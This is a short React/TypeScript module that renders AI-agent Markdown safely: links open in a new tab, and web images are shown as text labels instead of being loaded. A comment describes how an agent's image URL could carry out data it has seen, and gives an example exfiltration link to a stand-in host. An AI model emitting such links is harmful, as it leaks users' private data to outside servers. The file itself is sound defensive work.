import type { Components } from 'react-markdown';

// How Markdown from an agent (or a file it wrote) is drawn, everywhere it is
// drawn: links open in the browser, and pictures from the web are not loaded.
//
// A picture whose address is a web address would be fetched by the window as
// soon as it is drawn, and the address can carry anything the agent has seen
// (`![x](https://example.test/p?d=...)`). The bridge's content security policy
// refuses those loads (bridge/bridge.ts); this draws the picture's description
// in their place instead of a broken-picture icon.
export const mdComponents: Components = {
  a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noopener noreferrer" title={props.title ?? props.href} />,
  img: ({ alt, src }) => (
    <span className="md-img" title={`Pictures from the web are not loaded here.${typeof src === 'string' && src ? ` ${src}` : ''}`}>
      {alt ? `Picture: ${alt}` : 'Picture'}
    </span>
  ),
};
